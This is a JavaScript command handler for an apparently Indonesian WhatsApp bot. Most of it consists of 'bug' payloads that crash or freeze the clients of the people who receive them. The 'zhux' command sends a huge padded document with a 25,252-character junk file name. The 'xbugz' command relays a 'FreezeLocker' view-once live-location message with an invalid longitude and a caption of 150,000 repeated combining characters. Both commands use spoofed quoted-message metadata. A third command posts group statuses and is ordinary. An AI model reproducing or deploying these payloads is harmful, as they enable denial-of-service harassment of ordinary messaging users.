// case.js
import crypto from "crypto";
import {
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessageFromContent
} from "wileys";
import chalk from "chalk";
import fs from "fs";
const { proto } = baileys;

export default async function handleMessage(sock, msgUpdate) {
try {
if (!msgUpdate.messages || !msgUpdate.messages.length) return
const m = msgUpdate.messages[0]
if (!m.message) return
const msg = m.message
const getText = (msg) => {
  if (!msg) return ""
  if (msg.ephemeralMessage) {
    msg = msg.ephemeralMessage.message
  }
  if (msg.viewOnceMessageV2) {
    msg = msg.viewOnceMessageV2.message
  }
  return (
    msg.conversation ||
    msg.extendedTextMessage?.text ||
    msg.imageMessage?.caption ||
    msg.videoMessage?.caption ||
    msg.documentMessage?.caption ||
    ""
  )
}
const text = getText(msg)
if (!text) return
const prefix = ".";
if (!text.startsWith(prefix)) return;
const command = text.slice(prefix.length).trim().toLowerCase();
const chat = m.key.remoteJid;
   
    const vcard = `BEGIN:VCARD
VERSION:3.0
N:;ttname;;;
FN:ttname
item1.TEL;waid=13135550002:+1 (313) 555-0002
item1.X-ABLabel:Ponsel
END:VCARD`;

    const fakeMenuMetaAiQuoted = {
      key: {
        fromMe: false,
        participant: "13135550002@s.whatsapp.net",
        remoteJid: "status@broadcast",
        id: "XezstrysBot-003"
      },
      message: {
        contactMessage: {
          displayName: "💫 𝗩𝗜𝗣",
          vcard: vcard
        }
      },
      pushName: "aabbccdd"
    };
    
const fakeStickerPackQuoted = {
  key: {
    remoteJid: "2234030896@g.us",
    fromMe: false,
    id: "SKYXHO-" + Date.now(),
    participant: "18002428478@s.whatsapp.net"
  },

  message: {
    stickerPackMessage: {
      stickerPackId: "SKYXHO-" + Date.now(),
      name: "🕊️ -𝐙𝐡𝐮𝐱 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫🦠",
      publisher: "Xezstrys",
      stickers: [
        {
          url: null,
          mimetype: "image/webp",
          fileSha256: Buffer.from("AAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDD==", "base64"),
          fileEncSha256: Buffer.from("AAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDDAAAAABBBBBBBCCCCCCDDDDD==", "base64"),
          mediaKey: Buffer.alloc(32),
          fileLength: 252525
        }
      ]
    }
  },

  pushName: "skyxho"
};

const isGroup = m.key.remoteJid.endsWith("@g.us");
const sender = m.key.participant || m.key.remoteJid;
const isOwner = sender === "6285601800364@s.whatsapp.net";

const reply = (text) =>
  sock.sendMessage(m.key.remoteJid, { text }, { quoted: m });

const wait = "⏳ tunggu bentar...";
 
    switch (command) {

case "zhux": {
const allowedUsers = [
"6285601800364@s.whatsapp.net"
];
const sender = m.key.participant || m.key.remoteJid;
const userCommand = command || "unknown";
const userTime = new Date().toLocaleTimeString("id-ID", { hour12: false });
const start = Date.now();
const end = Date.now();
const speed = end - start;
console.log(
chalk.white("\n") + "┏╾" + "<💭>" +
chalk.bgGreen.black("[ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ]") + " " +
chalk.cyan.bold(`.${userCommand}`) + " <⏰>" +
chalk.bgGray.white.bold(`[${userTime}]`) + " " +
chalk.white(" ") + " " +
chalk.white("\n") + "┣" + 
chalk.yellow.bold(`[ ${sender} ]`) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
chalk.white("\n") + "┗╾≫" + " " +
chalk.bgRed.black("[️々]") + " " +
chalk.white.bold("Sending with out message . . .") + " "
);
if (!allowedUsers.includes(sender)) {
await sock.sendMessage(
m.key.remoteJid,
{
text: "*g ad akses lu*",
},
{ quoted: fakeStickerPackQuoted }
);
break;
}
const thumbPath = "./zhux.webp";
const thumbExists = fs.existsSync(thumbPath);
const thumbBuffer = thumbExists ? fs.readFileSync(thumbPath) : null;
const text = "".repeat(25252);
const suki = {
title: "𝐓𝐡𝐚𝐭'𝐬 𝐒𝐨 𝐙𝐡𝐮𝐱? 🦠",
body: "© 2025 - 2026",
thumbnail: thumbBuffer,
sourceUrl: "t.me/xvoldz",
mediaType: 1,
renderLargerThumbnail: false,
};
const footer = "🅵🅾🅾🆃🅴🆁";
const fakeDoc = Buffer.alloc(100 * 100 * 100, "㑒 `𝐅𝐮𝐜𝐤𝐙𝐡𝐮𝐱 || 𝐒𝐢𝐠𝐦𝐚 𝐁𝐨𝐲𝐬 🥵");
const mentions = ['status@broadcast'];
await sock.sendMessage(m.key.remoteJid, { react: { text: "⏳", key: m.key } });
await sock.sendMessage(
m.key.remoteJid,
{
document: fakeDoc,
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
fileName: "\uE28080".repeat(25252),
caption: text,
footer: footer,
contextInfo: { 
externalAdReply: suki,
mentionedJid: mentions,
ai: false,
forwardingScore: 252,
isForwarded: true,
businessMessageForwardInfo: { 
businessOwnerJid: "0@s.whatsapp.net" },
forwardedNewsletterMessageInfo: {
newsletterJid: "120363405191556298@newsletter",
newsletterName: "🕊️-𝐗𝐙𝐇𝐔𝐗 𝐕𝐈𝐏-".repeat(1),
serverMessageId: null
}
},
},
{ quoted: fakeStickerPackQuoted }
);
await sock.sendMessage(m.key.remoteJid, { react: { text: "✅", key: m.key } });
break;
}

case "xbugz": {
  const jid = m.key.remoteJid
  const xbugz = "ꦿꦽꦾꦷꦶꦵ".repeat(25000);
  const mentions = ['status@broadcast'];
  const suki = {
title: "𝐓𝐡𝐚𝐭'𝐬 𝐒𝐨 𝐙𝐡𝐮𝐱? 🦠",
body: "© 2025 - 2026",
thumbnail: Buffer.alloc(0),
sourceUrl: "t.me/wskyxhouds",
mediaType: 1,
renderLargerThumbnail: false,
};
  const FreezeLocker = proto.Message.fromObject({
viewOnceMessageV2: {
message: {
liveLocationMessage: {
degreesLatitude: -9.09999262999,
degreesLongitude: 199.99963118999,
accuracyInMeters: 252525,
speedInMps: 252525,
degreesHeading: 252525,
caption: "🩸⃟༑⃟႟-𝐙᳝̻̻̻͆͆͆᷼͢𝐡̻̻𞥉͆͆͆͆͆𝐮᳝̻̻̻̻͆͆᷼͢͠𝐱ؚ̻᪲͆͆͆͆ 𝐄᳝̻͆͆᷼͢𝐱̻̻̻᪲͆͆͆͆͆𝐞᳝̻̻𞥉͆᷼͢͠𝐜ؚ̻̻̻̻̻͆͆͆ཀ͜͡🦠" + xbugz + xbugz + xbugz,
sequenceNumber: 252525,
timeOffset: 252525,
contextInfo: { 
externalAdReply: suki,
mentionedJid: mentions,
ai: false,
forwardingScore: 252,
isForwarded: true,
businessMessageForwardInfo: { 
businessOwnerJid: "0@s.whatsapp.net" },
forwardedNewsletterMessageInfo: {
newsletterJid: "120363405191556298@newsletter",
newsletterName: "🕊️-𝐙𝐇𝐔𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐃-".repeat(1),
serverMessageId: null
}
},
jpegThumbnail: Buffer.alloc(0)
}
}
}
})

const sleep = ms => new Promise(r => setTimeout(r, ms))

for (let i = 0; i < 1; i++) {
  await sock.relayMessage(jid, FreezeLocker, {
    quoted: fakeStickerPackQuoted
  })
  await sleep(300)
}

break;
}

case "upswgc": {
  if (!isGroup) return reply("❌ khusus grup jir");
  if (!isOwner) return reply("❌ owner doang");

  await reply(wait);

  const ctx = m.message?.extendedTextMessage?.contextInfo;
  const quoted = ctx?.quotedMessage;
  const caption = text.replace(/^upswgc/i, "").trim();
  const jid = m.key.remoteJid;

  let content = {};
  const options = {
    upload: sock.waUploadToServer
  };

  const downloadQuoted = async (type, key) => {
    const stream = await downloadContentFromMessage(
      quoted[key],
      type
    );
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };

  if (caption && !quoted) {
    content = { text: caption };
    options.backgroundColor =
      "#" + Math.floor(Math.random() * 16777215).toString(16);
  } else if (quoted) {
    const mediaKey = Object.keys(quoted).find(k =>
      ["imageMessage", "videoMessage", "audioMessage"].includes(k)
    );

    if (!mediaKey) {
      return reply(
        "❗ reply media / kasih teks\n\nContoh:\n.upswgc teks\n.upswgc teks (reply media)"
      );
    }

    const mime = quoted[mediaKey]?.mimetype || "";

    if (mediaKey === "imageMessage") {
      const buf = await downloadQuoted("image", mediaKey);
      content = { image: buf, caption: caption || undefined };

    } else if (mediaKey === "videoMessage") {
      const buf = await downloadQuoted("video", mediaKey);
      content = {
        video: buf,
        caption: caption || undefined,
        gifPlayback: /gif/i.test(mime)
      };

    } else if (mediaKey === "audioMessage") {
      const buf = await downloadQuoted("audio", mediaKey);
      const isOpus = /opus|ogg/i.test(mime);
      content = {
        audio: buf,
        mimetype: isOpus
          ? "audio/ogg; codecs=opus"
          : mime || "audio/mpeg",
        ptt: isOpus
      };
    }
  } else {
    return reply("❗ reply media atau isi teks");
  }

  try {
    const inside = await generateWAMessageContent(content, options);
    const messageSecret = crypto.randomBytes(32);

    const msgToSend = generateWAMessageFromContent(
      jid,
      {
        groupStatusMessageV2: {
          message: {
            ...inside,
            messageContextInfo: { messageSecret }
          }
        }
      },
      {}
    );

    await sock.relayMessage(jid, msgToSend.message, {
      messageId: msgToSend.key.id
    });

    await reply("✅ status grup ke-send jir");
  } catch (e) {
    console.error("upswgc error:", e);
    reply("❌ gagal kirim status grup");
  }

  break;
}

}
} catch (err) {
console.error("⚠️ Error di case.js :", err);
}
}